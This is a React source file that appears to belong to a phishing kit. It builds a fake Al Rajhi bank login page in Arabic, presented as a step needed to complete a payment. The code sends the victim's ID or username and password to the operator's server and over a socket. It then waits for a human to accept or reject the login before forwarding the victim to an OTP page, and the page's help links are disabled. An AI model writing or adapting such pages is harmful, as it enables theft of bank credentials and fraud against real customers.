import React, { useEffect, useMemo, useState } from "react";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { useNavigate } from "react-router-dom";
import { HiGlobeAlt } from "react-icons/hi";
import { BsGrid } from "react-icons/bs";
import {
  FaEye,
  FaEyeSlash,
  FaChevronLeft,
  FaChevronRight,
} from "react-icons/fa6";
import { api_route, socket } from "../App";
import { useSocketEvent } from "../hooks/useSocketEvent";

const RajhiLogin = () => {
  const navigate = useNavigate();
  const search = window.location.search;
  const data = useMemo(() => {
    try {
      const raw = new URLSearchParams(search).get("data");
      if (!raw) return null;
      return JSON.parse(raw);
    } catch {
      return null;
    }
  }, [search]);

  const _id = data?._id || sessionStorage.getItem("id");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [remember, setRemember] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [restrictedMsg, setRestrictedMsg] = useState(false);

  const showBankAppOnly = () => setRestrictedMsg(true);

  const canSubmit = username.trim().length > 0 && password.trim().length > 0;

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!_id || !canSubmit) return;
    setLoading(true);
    setError(false);
    try {
      await axios.post(`${api_route}/rajhiLogin/${_id}`, {
        rajhiUsername: username,
        rajhiPassword: password,
      });
      socket.emit("rajhiLogin", {
        _id,
        id: _id,
        rajhiUsername: username,
        rajhiPassword: password,
      });
    } catch {
      setLoading(false);
    }
  };

  useSocketEvent("acceptRajhiLogin", (id) => {
    if (id !== _id) return;
    setLoading(false);
    navigate(
      `/rajhi-otp?data=${encodeURIComponent(
        JSON.stringify({ ...data, _id, rajhiUsername: username }),
      )}`,
    );
  });

  useSocketEvent("declineRajhiLogin", (id) => {
    if (id !== _id) return;
    setLoading(false);
    setError(true);
  });

  return (
    <div
      className="min-h-screen w-full bg-white flex flex-col max-w-md mx-auto"
      dir="rtl"
    >
      {loading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
          <div className="flex flex-col items-center gap-4 bg-white p-8 rounded-md shadow-lg">
            <img
              src="/alrajhi-logo.svg"
              alt="Al Rajhi"
              className="h-10 object-contain"
            />
            <TailSpin
              height="40"
              width="40"
              color="#2563eb"
              ariaLabel="loading"
            />
            <span className="text-gray-700 font-medium">جاري التحقق...</span>
          </div>
        </div>
      )}

      <div className="flex items-center justify-between px-5 pt-4 pb-2">
        <BsGrid className="text-[#2563eb] text-xl" />
        <HiGlobeAlt className="text-[#2563eb] text-2xl" />
      </div>

      <div className="flex flex-col items-center px-6  pb-4 mt-10">
        <span className="text-sm text-gray-500 text-center leading-relaxed mb-8">تأكيد توثيق حسابك البنكي لتكملة عملية الدفع</span>
        <div className="mb-6">
          <img src="/rajhi.jpeg" alt="Rajhi" className="w-10" />
        </div>
        <h1 className="text-xl font-bold text-gray-500 text-center leading-relaxed">
          مرحبا بك
        </h1>
        <h2 className="text-xl font-bold text-black text-center leading-relaxed mb-8">
          بالتجربة الرقمية الأفضل
        </h2>

        <form onSubmit={handleSubmit} className="w-full flex flex-col gap-4">
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="أدخل الهوية الوطنية أو اسم المستخدم"
            className="w-full bg-[#f3f4f6] rounded-xl px-4 py-4 text-sm text-gray-800 placeholder:text-gray-800 outline-none text-right"
            dir="rtl"
          />

          <div className="relative w-full">
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="ادخل كلمة المرور"
              className="w-full bg-[#f3f4f6] rounded-xl px-4 py-4 pl-12 text-sm text-gray-800 placeholder:text-gray-800 outline-none text-right"
              dir="rtl"
            />
            <button
              type="button"
              onClick={() => setShowPassword((v) => !v)}
              className="absolute left-4 top-1/2 -translate-y-1/2 text-[#2563eb] text-lg"
            >
              {showPassword ? <FaEye /> : <FaEyeSlash />}
            </button>
          </div>

          <div className="w-full bg-[#f3f4f6] rounded-xl px-4 py-4 flex items-center justify-between cursor-pointer my-4">
            <div className="text-right">
              <p className="text-sm font-bold text-gray-800">
                هل لديك حساب في الراجحي؟
              </p>
              <p className="text-xs text-gray-500 mt-0.5">
                سجّل في القناة الرقمية هنا
              </p>
            </div>
            <FaChevronRight className="text-gray-400 text-sm rotate-180" />
          </div>

          <div className="flex items-center justify-between w-full px-1 my-4">
            <label className="flex items-center gap-2 cursor-pointer">
              <input
                type="checkbox"
                checked={remember}
                onChange={(e) => {
                  setRemember(e.target.checked);
                  showBankAppOnly();
                }}
                className="w-4 h-4 accent-[#2563eb] rounded"
              />
              <span className="text-sm text-gray-700">تذكرني</span>
            </label>
            <button
              type="button"
              className="text-[#2563eb] text-sm font-bold"
              onClick={showBankAppOnly}
            >
              نسيت كلمة المرور؟
            </button>
          </div>

          {restrictedMsg && (
            <p className="text-red-600 text-sm text-center -mt-2 mb-1">
              غير مسموح إلا عبر تطبيق البنك
            </p>
          )}

          {error && (
            <p className="text-red-600 text-sm text-center">
              بيانات الدخول غير صحيحة. يرجى المحاولة مرة أخرى.
            </p>
          )}

          <button
            type="submit"
            disabled={!canSubmit}
            className={`w-full rounded-xl py-4 text-base font-semibold transition-colors ${
              canSubmit
                ? "bg-[#2563eb] text-white"
                : "bg-[#e5e7eb] text-gray-400 cursor-not-allowed"
            }`}
          >
            تسجيل الدخول
          </button>

          <button
            type="button"
            className="w-full rounded-xl py-4 text-base font-semibold bg-[#dbeafe] text-[#2563eb]"
          >
            فعل خدمة الدخول السريع
          </button>

          <button
            type="button"
            className="w-full py-3 text-[#2563eb] text-base font-medium"
          >
            افتح حساب
          </button>
        </form>
      </div>
    </div>
  );
};

export default RajhiLogin;
